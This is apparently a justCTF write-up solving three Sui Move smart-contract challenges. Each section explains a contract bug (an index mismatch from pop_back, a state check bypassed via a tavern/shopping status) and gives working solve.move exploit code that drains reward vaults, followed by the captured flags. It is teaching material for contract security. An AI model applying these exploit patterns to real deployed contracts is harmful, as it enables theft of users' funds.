
**[#1 The Otter Scrolls]**

To solve this level, we need to call the `cast_spell` function with the correct sequence of indices to set the `casted` attribute of the `Spellbook` to `true`. The function checks specific magic words in sequence: "Inferno" (fire), "Zephyr" (wind), "Call" (water), "Granite" (earth), and "Wazzup" (power).

We determined the indices for these words in their respective vectors and constructed the sequence `[1, 0, 3, 3, 3]`. This sequence corresponds to the required magic words in the correct order. By calling `cast_spell` with this sequence and verifying with `check_if_spell_casted`, we ensure the spell is successfully cast.


`solve.move` script:
```rust
module solve::solve {
    // [*] Import dependencies
    use challenge::theotterscrolls;
    public fun solve(
        _spellbook: &mut theotterscrolls::Spellbook,
        _ctx: &mut TxContext
    ) {
        // Your code here...
        let spell_sequence = vector[1, 0, 3, 3, 3];
        theotterscrolls::cast_spell(spell_sequence, _spellbook);
    }
}
```
```javascript
Flag: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}
```





**[#2 Dark BrOTTERhood]**

To solve this level, we need to interact with the smart contract by calling several functions to register a player, equip them with a sword, find and fight monsters, get the rewards, and ultimately prove the solution.

The root cause of the problem is these lines in the `get_the_reward` function:
```javascript
    public fun get_the_reward(quest_id: u64, ...) {
        // check status with quest_id
        let quest_to_claim = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);

        // but pop last index instead of quest_id
        let monster = vector::pop_back(&mut board.quests);
        ...
    }
```

The check is correctly performed against the quest_id, ensuring the fight_status is FINISHED. However, the pop_back function removes and returns the last element in the vector and the reward is mistakenly based on the last element of the vector rather than the quest at the quest_id index. This mismatch leads to inconsistencies and errors in the quest state management.


`solve.move`:
```javascript
module solve::solve {
    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};
    use sui::random::Random;
    #[allow(lint(public_random))]
    public fun solve(
        _vault: &mut Otter::Vault<OTTER>,
        _questboard: &mut Otter::QuestBoard,
        _player: &mut Otter::Player,
        _r: &Random,
        _ctx: &mut TxContext,
    ) {
        // Your code here ...
        // buy sword and defead at least one monster
        Otter::buy_sword(_vault, _player, _ctx);
        Otter::find_a_monster(_questboard, _r, _ctx);
        Otter::fight_monster(_questboard, _player, 0);
        Otter::return_home(_questboard, 0);

        let times: u64 = 100;
        let mut i: u64 = 0;
        while (i < times) {
            // add new monster at the end of quest vector
            Otter::find_a_monster(_questboard, _r, _ctx);
            // use defeated monter quest_id to get reward
            Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx);
            i = i + 1;
        };

        // but flag
        let flag = Otter::buy_flag(_vault, _player, _ctx);
        Otter::prove(_questboard, flag);
    }
}
```
```javascript
Flag: justCTF{I_us3d_to_b3_an_ott3r_until_i_t00k_th4t_arr0w}
```




**[#3 World of Ottercraft]**

The vulnerability in this challenge stems from the fact that the get_the_reward function does not verify monster power before awarding the reward. Instead, it simply pops the monster from the vector and grants the reward. Here’s the relevant code from the get_the_reward function:


```javascript
public fun get_the_reward(vault: &mut Vault<OTTER>, board: &mut QuestBoard, player: &mut Player, ctx: &mut TxContext) {
    assert!(player.status != RESTING && player.status != PREPARE_FOR_TROUBLE && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);
    // pop monter
    let monster = vector::remove(&mut board.quests, player.quest_index);
    ...
    // get reward from vault
    let coins = coin::split(&mut vault.cash, reward, ctx); 
    ...
    // send reward to player
    balance::join(&mut player.wallet, balance);

    player.status = RESTING;
}
```

In contrast, the return_home function, which should be called before get_the_reward, includes a crucial check to ensure that the monster's power is zero (indicating the monster has been defeated):


```javascript
public fun return_home(board: &mut QuestBoard, player: &mut Player) {
    assert!(player.status != SHOPPING && player.status != FINISHED && player.status != RESTING && player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE);

    let quest_to_finish = vector::borrow(&board.quests, player.quest_index);
    assert!(quest_to_finish.power == 0, WRONG_AMOUNT);

    player.status = FINISHED;
}
```

Exploiting the Vulnerability

To exploit this vulnerability, we need to avoid calling return_home and directly call get_the_reward. This can be achieved if we can enter the get_the_reward function while the player's status is SHOPPING, which can be done by calling the enter_tavern function. The following sequence of operations allows us to repeatedly call get_the_reward without the necessary checks.

```javascript
module solve::solve {
    // [*] Import dependencies
    use challenge::Otter::{Self, OTTER};
    public fun solve(
        _board: &mut Otter::QuestBoard,
        _vault: &mut Otter::Vault<OTTER>,
        _player: &mut Otter::Player,
        _ctx: &mut TxContext
    ) {
        // Your code here...
        // buy sword because we need to defeat monter to change state
        let mut ticket = Otter::enter_tavern(_player);
        Otter::buy_sword(_player, &mut ticket);
        Otter::checkout(ticket, _player, _ctx, _vault, _board);

        // add monter to vector so get_the_reward function can pop them later
        let num_quests: u64 = 24;
        let mut i: u64 = 0;
        while (i < num_quests) {
            Otter::find_a_monster(_board, _player);
            i = i + 1;
        };

        // continue scenario to reach RESTING status again
        Otter::bring_it_on(_board, _player, 0);
        Otter::return_home(_board, _player);
        Otter::get_the_reward(_vault, _board, _player, _ctx);

        // now we have full vector of monters we can set status to SHOPPING and loop over get_the_reward
        i = 0;
        while (i < num_quests - 1) {
            // enter SHOPPING status
            let mut shield_ticket = Otter::enter_tavern(_player);
            // buy something cheap just so we can checkout later
            Otter::buy_shield(_player, &mut shield_ticket);
            // enter get_the_reward in SHOPPING status and get reward without defeating monter
            Otter::get_the_reward(_vault, _board, _player, _ctx);
            // checkout because we need to use shield_ticket
            Otter::checkout(shield_ticket, _player, _ctx, _vault, _board);
            i = i + 1;
        };

        // buy flag
        let mut final_ticket = Otter::enter_tavern(_player);
        Otter::buy_flag(&mut final_ticket, _player);
        Otter::checkout(final_ticket, _player, _ctx, _vault, _board);
    }

}
```



```javascript
Flag: justCTF{Ott3r_uses_expl0it_its_sup3r_eff3ctiv3}'
```









